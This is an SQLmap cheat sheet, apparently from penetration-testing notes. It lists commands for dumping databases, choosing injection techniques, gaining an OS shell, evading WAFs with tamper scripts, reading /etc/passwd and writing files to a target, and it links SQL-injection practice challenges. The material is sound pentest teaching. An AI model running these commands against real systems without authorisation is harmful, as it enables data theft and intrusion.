---
title: "SQLmap"
description: "SQLmap is an open-source tool that automates the detection and exploitation of SQL Injection vulnerabilities. It is the essential tool for web penetration testing."
seo:
  title: ""
  description: "SQLmap is an open-source tool that automates the detection and exploitation of SQL Injection vulnerabilities. It is the essential tool for web penetration testing."
---

SQLmap is an open-source tool that automates the detection and exploitation of SQL Injection vulnerabilities. It is the essential tool for web penetration testing.

## Basic Commands

| Action         | Command                                                     |
| -------------- | ----------------------------------------------------------- |
| Simple test    | `sqlmap -u $url`                                            |
| POST Request   | `sqlmap -u $url --data "username=test&password=test"`       |
| List databases | `sqlmap -u $url --dbs`                                      |
| List tables    | `sqlmap -u $url -D $dbname --tables`                        |
| List columns   | `sqlmap -u $url -D $dbname -T $table --columns`             |
| Data Dump      | `sqlmap -u $url -D $dbname -T $table -C "COL1,COL2" --dump` |

## Injection Techniques

SQLmap can use various techniques to extract data. You can specify them to refine your search.

| Option                   | Technique                                                                                                                     |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------- |
| `-p "param"`             | Specifies the vulnerable parameter to test.                                                                                   |
| `--technique=BUEST`      | Only uses the specified techniques: **B**oolean-based, **U**nion-based, **E**rror-based, **S**tacked queries, **T**ime-based. |
| `--level=3`              | Sets the aggression level of the test (1 to 5). A higher level tests more parameters (Headers, Cookies, etc.).                |
| `--risk=3`               | Sets the risk of the injected payload (1 to 3). A higher risk may involve writing to the DB.                                  |
| `--os-shell`             | Attempts to gain an interactive Operating System shell (if privileges allow).                                                 |
| `--cookie "SESSION=..."` | Injects a cookie to maintain the session state.                                                                               |
| `--random-agent`         | Use a random HTTP User-Agent header from a list to evade simple bot detection based on fixed User-Agents.                     |

## WAF Evasion

SQLmap offers tamper scripts to automatically obfuscate payloads, helping to bypass Web Application Firewalls (WAFs) and basic filtering mechanisms.

```sh
sqlmap -u $url --tamper=SCRIPT
```

{{< details "See most used tamper scripts" >}}

| Script                      | Description                   |
| --------------------------- | ----------------------------- |
| `space2comment`             | replaces spaces with `/**/`   |
| `unionalltostackedsqueries` | changes `UNION ALL` structure |
| `apostrophemask`            | obfuscates apostrophes        |

{{< /details >}}

## File Access

{{< callout note >}} ⚠️ Requires a user with sufficient privileges (e.g., `FILE`privilege). {{< /callout >}}

| Action       | Command                                                                      |
| ------------ | ---------------------------------------------------------------------------- |
| Read a file  | `sqlmap -u $url --file-read "/etc/passwd"`                                   |
| Write a file | `sqlmap -u $url --file-write "/tmp/localFile" --file-dest "/path/to/remote"` |

## SQLi Challenges

- [Root-me - Injection Auth](https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Authentification)
- [Root-me - Injection Auth GBK](https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-authentification-GBK)
- [Root-me - String](https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-String)
- [Root-me - Error](https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error)
- [Root-me - Time based](https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Time-based)
